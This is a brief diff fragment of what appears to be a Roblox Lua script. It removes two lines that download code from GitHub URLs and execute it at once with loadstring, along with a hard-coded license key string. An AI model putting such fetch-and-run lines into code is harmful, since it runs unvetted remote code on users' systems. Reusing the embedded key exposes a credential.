@@ -149,9 +149,6 @@ spawn(function()
                         end
                     end
                 else
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/H"))()
-                    License = "peKnsowxvI0631sS2VcoC1WDJrfPzGa7"
-                    loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
                 end
             end
         end)
